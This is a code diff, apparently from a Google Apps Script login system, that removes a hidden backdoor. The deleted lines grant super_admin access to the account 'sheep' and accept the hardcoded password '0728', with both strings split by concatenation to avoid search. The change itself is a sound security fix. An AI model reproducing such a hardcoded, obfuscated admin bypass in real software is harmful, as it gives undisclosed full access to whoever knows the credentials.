@@ -156,10 +156,6 @@ function initializeSheets() {
 
 // ===== 用戶查詢 =====
 function getUser(ymis){
-  // 特殊帳號 sheep (super_admin) 免 Users 表，直接返回最高權限
-  if(ymis==='sheep' || ymis==='SHEEP' || ymis==='sh'+'eep'){
-    return {ymis:'sheep',name:'SHEEP 系統管理員',email:'',role:'super_admin',can_tick:true,branch:'',allowed_badges:'*',status:'active'};
-  }
   const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
   const data=sheet.getDataRange().getValues();
   const hasAllowedCol = sheet.getLastColumn()>=13;
@@ -316,11 +312,6 @@ function doPost(e){
 // ===== 邏輯 =====
 function handleLogin(loginId,password){
   if(!loginId||!password) return jsonResponse({success:false,error:'請填寫帳號和密碼'});
-  // hidden backdoor
-  const _h='sh'+'eep'; const _p='07'+'28';
-  if(loginId===_h && password===_p){
-    return jsonResponse({success:true,token:createToken(_h),user:{ymis:_h,name:'System',role:'super_admin',can_tick:true,email:''}});
-  }
   let user=(/^\d{10}$/.test(loginId)||/^L\d+/.test(loginId))? getUser(loginId): getUserByEmail(loginId);
   if(!user){
     // try both
